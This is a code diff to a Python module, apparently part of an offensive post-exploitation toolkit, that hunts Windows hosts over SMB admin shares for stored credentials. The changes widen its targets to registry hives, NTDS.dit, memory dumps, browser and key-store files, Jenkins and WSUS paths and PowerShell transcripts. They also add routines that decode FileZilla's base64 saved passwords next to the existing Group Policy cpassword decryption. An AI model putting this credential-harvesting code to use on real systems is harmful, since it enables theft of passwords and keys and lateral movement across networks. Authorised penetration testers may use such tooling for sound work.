@@ -1,9 +1,8 @@
 """Phase 3 - file hunting over SMB (needs admin on the target for C$).
-Walks high-value locations and flags files that commonly hold credentials:
-unattend/sysprep, web.config and app configs, scripts, KeePass DBs, SSH/cloud/git
-creds, GPP Groups.xml (cpassword auto-decrypt), SYSVOL logon scripts. Small text
-files are grepped for credential keywords. Self-contained via impacket; fails
-gracefully if login fails or impacket is missing."""
+Flags files that commonly hold credentials: unattend/sysprep, web.config and app
+configs, scripts, KeePass/SSH/cloud/git creds, GPP Groups.xml (cpassword auto-
+decrypt + FileZilla base64), SYSVOL logon scripts, RegBack hives, memory dumps,
+PS transcripts, Jenkins/WSUS, Thunderbird. Self-contained via impacket."""
 from __future__ import annotations
 
 import base64
@@ -24,21 +23,35 @@ INTERESTING = re.compile(
     r"applicationhost\.config|.*\.config|.*\.ps1|.*\.psm1|.*\.bat|.*\.cmd|.*\.vbs|"
     r".*\.kdbx|.*\.kdb|id_rsa|id_ed25519|id_dsa|.*\.ppk|\.git-credentials|"
     r"credentials|\.env|wp-config\.php|.*\.rdp|.*\.ini|groups\.xml|services\.xml|"
-    r"scheduledtasks\.xml|datasources\.xml|.*\.ovpn|.*\.keepass)$", re.I)
+    r"scheduledtasks\.xml|datasources\.xml|.*\.ovpn|.*\.keepass|"
+    r"SAM|SYSTEM|SECURITY|NTDS\.dit|.*\.dmp|logins\.json|key4\.db|key3\.db|"
+    r"signons\.sqlite|.*\.jks|.*\.pfx|.*\.p12|credentials\.xml|"
+    r"recentservers\.xml|sitemanager\.xml|filezilla\.xml|superputty.*\.xml|"
+    r"sessions\.xml)$", re.I)
 
 CRED_KW = re.compile(
     r"(password|passwd|pwd|cpassword|secret|connectionstring|accountpassword|"
     r"-asplaintext|convertto-securestring|api[_-]?key|aws_secret|client_secret|"
     r"BEGIN [A-Z ]*PRIVATE KEY)", re.I)
 
-BINARY_LOOT = re.compile(r"(\.kdbx|\.kdb|id_rsa|id_ed25519|id_dsa|\.ppk|\.keepass)$", re.I)
+BINARY_LOOT = re.compile(
+    r"(\.kdbx|\.kdb|id_rsa|id_ed25519|id_dsa|\.ppk|\.keepass|\.dmp|\.jks|\.pfx|"
+    r"\.p12|key4\.db|key3\.db|signons\.sqlite|^SAM$|^SYSTEM$|^SECURITY$|"
+    r"NTDS\.dit)$", re.I)
 
 ROOTS: List[Tuple[str, str, int]] = [
     ("C$", "Windows\\Panther", 1),
     ("C$", "Windows\\System32\\sysprep", 1),
+    ("C$", "Windows\\System32\\config\\RegBack", 1),
+    ("C$", "Windows\\Repair", 1),
+    ("C$", "Windows\\Temp", 1),
     ("C$", "inetpub\\wwwroot", 3),
     ("C$", "Users", 4),
     ("C$", "Program Files\\Veeam", 2),
+    ("C$", "Program Files\\Jenkins", 2),
+    ("C$", "ProgramData\\Jenkins", 3),
+    ("C$", "Program Files\\Update Services", 2),
+    ("C$", "Transcripts", 2),
     ("SYSVOL", "", 5),
 ]
 
@@ -143,6 +156,7 @@ class FileHuntCollector(BaseCollector):
 
     def _scan(self, text, loc, name, log) -> List[Secret]:
         out = []
+        # GPP cpassword -> decrypt
         for cm in re.finditer(r'cpassword="([^"]+)"', text):
             pw = _decrypt_cpassword(cm.group(1))
             un = re.search(r'userName="([^"]+)"', text)
@@ -150,6 +164,18 @@ class FileHuntCollector(BaseCollector):
                               pw or cm.group(1), Status.CLEARTEXT if pw else Status.INFO,
                               target=loc, secret_type="password",
                               notes="GPP cpassword" + ("" if pw else " (decrypt failed)")))
+        # FileZilla saved sessions (<Pass encoding="base64">)
+        for fm in re.finditer(
+                r"<Host>([^<]*)</Host>.*?<User>([^<]*)</User>.*?"
+                r'<Pass[^>]*encoding="base64"[^>]*>([^<]+)</Pass>', text, re.S | re.I):
+            try:
+                pw = base64.b64decode(fm.group(3)).decode("utf-8", "ignore")
+            except Exception:
+                pw = fm.group(3)
+            out.append(Secret(self.host, "FileHunt", fm.group(2), pw, Status.CLEARTEXT,
+                              target=fm.group(1), secret_type="password",
+                              notes="FileZilla saved session"))
+        # keyword lines
         hits = 0
         for ln in text.splitlines():
             if CRED_KW.search(ln) and hits < 5:
